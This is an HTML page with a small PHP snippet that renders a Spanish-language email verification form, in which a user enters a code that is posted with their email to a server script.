<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verificar Codigo</title>
    <style>
        body {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background-color: #f7f7f7;
        }

        .card {
            width: 100%;
            max-width: 400px;
            margin: 0 auto;
            background-color: white;
            border-radius: 12px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.15);
            padding: 30px;
        }

        .card-header {
            padding-bottom: 10px;
            margin-bottom: 10px;
        }

        .card-title {
            font-size: 26px;
            font-family: Arial, Helvetica, sans-serif;
            margin: 0;
        }

        .card-description {
            font-size: 16px;
            color: #555;
            font-family: Arial, Helvetica, sans-serif;
            margin-top: 10px;
        }

        .card-content {
            margin: 20px 0;
        }

        .input-group {
            margin-bottom: 20px;
        }

        .label {
            display: block;
            font-size: 16px;
            font-weight: 530;
            font-family: Arial, Helvetica, sans-serif;
            margin-bottom: 10px;
        }

        .input {
            width: 90%;
            padding: 15px;
            font-size: 18px;
            border: 1px solid #ccc;
            border-radius: 6px;
        }

        .card-footer {
            display: flex;
            justify-content: flex-end;
            margin-top: 20px;
        }

        .button {
            padding: 12px 25px;
            font-size: 17px;
            color: white;
            background-color: #000000;
            border: none;
            border-radius: 6px;
            cursor: pointer;
            transition: background-color 0.3s;
        }

        .button:hover {
            background-color: #3d3d3d;
        }
    </style>
</head>

<body>
    <form action="insert_code.php" method="POST">
        <input type="hidden" name="email" value="<?php echo htmlspecialchars($_GET['email']); ?>">
        <div class="card">
            <header class="card-header">
                <h1 class="card-title">Verifique su Correo Electrónico</h1>
                <p class="card-description">
                    Ingrese el código de verificación enviado a su dirección de correo electrónico para confirmar su
                    identidad.
                </p>
            </header>
            <div class="card-content">
                <div class="input-group">
                    <label for="verificationCode" class="label">Código de Verificación</label>
                    <input id="verificationCode" name="code" type="text" placeholder="Introduzca el Codigo"
                        class="input" />
                </div>
            </div>
            <div class="card-footer">
                <button type="submit" class="button">Verificar</button>
            </div>
        </div>
    </form>
</body>

</html>